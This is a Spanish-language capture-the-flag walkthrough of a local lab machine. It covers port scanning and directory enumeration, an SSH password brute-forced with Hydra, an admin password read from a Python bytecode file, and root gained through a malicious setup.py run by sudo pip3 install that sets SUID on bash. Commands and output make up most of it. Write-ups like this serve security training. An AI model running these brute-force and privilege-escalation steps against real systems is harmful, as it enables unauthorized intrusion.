
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --open --min-rate 5000 172.17.0.2 -oG nmap
nmap -sVC -p22,80 --min-rate 5000 172.17.0.2 -oG vers
```

Puertos abiertos:

| Puerto | Servicio | Detalle                      |
| ------ | -------- | ---------------------------- |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu         |
| 80     | HTTP     | Apache 2.4.41 — responde 404 |

---

## 2. Enumeración web

El servidor devuelve un 404 en la raíz. Se enumera con gobuster:

```bash
gobuster dir -u "http://172.17.0.2" \
  -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -b 404,403
```

Resultado:

```
/notes    [Status: 301]
```

El directorio `/notes/` tiene listado de archivos activo y contiene `note.txt`:

```bash
curl http://172.17.0.2/notes/note.txt
```

```
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```

---

## 3. Acceso SSH como dev — fuerza bruta

Las credenciales del note (`dev:developer123`) ya no funcionan — la contraseña ha sido cambiada. Se lanza fuerza bruta con Hydra:

```bash
hydra -l "dev" -P /opt/rockyou.txt ssh://172.17.0.2 -t 64
```

```
[22][ssh] host: 172.17.0.2   login: dev   password: computer
```

```bash
ssh dev@172.17.0.2
# contraseña: computer

dev@ebc324992b00:~$ whoami
dev
```

---

## 4. Escalada a admin — credenciales en bytecode Python

Durante la enumeración interna se encuentra un directorio de scripts con un archivo `.pyc`:

```bash
ls /opt/scripts/__pycache__/
# secret.cpython-38.pyc
```

Los archivos `.pyc` son bytecode compilado de Python. No son binarios opacos — los strings literales del código fuente quedan almacenados en texto plano dentro del archivo. Al hacer `cat` sobre él se pueden leer directamente:

```bash
cat /opt/scripts/__pycache__/secret.cpython-38.pyc
```

```
...username = 'admin'  password = 'p@$$w0r8321'...
```

Se usa `su admin` con esa contraseña:

```bash
su admin
# contraseña: p@$$w0r8321

admin@ebc324992b00:/home/dev$ whoami
admin
```

---

## 5. Escalada a root — pip install abuse

Se comprueba qué puede ejecutar `admin` con sudo:

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/pip3 install *
```

`admin` puede ejecutar `pip3 install` como root sin contraseña con cualquier argumento. Durante la instalación de un paquete, pip ejecuta el archivo `setup.py` del paquete con los privilegios del proceso — en este caso, root.

Se crea un paquete Python malicioso local:

```bash
mkdir /tmp/root && cd /tmp/root
```

```bash
cat > setup.py << 'EOF'
from setuptools import setup
import os

os.system("chmod u+s /bin/bash")

setup(name="root", version="1.0")
EOF
```

El `setup.py` llama a `chmod u+s /bin/bash`, que añade el bit SUID a bash. Cuando bash tiene SUID de root, se puede ejecutar con `-p` para mantener el effective UID de root.

Se instala el paquete como root:

```bash
sudo /usr/bin/pip3 install /tmp/root
```

```
Successfully installed root-1.0
```

Ahora bash tiene SUID:

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash

bash -p
bash-5.0# id
uid=1001(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
bash-5.0# whoami
root
```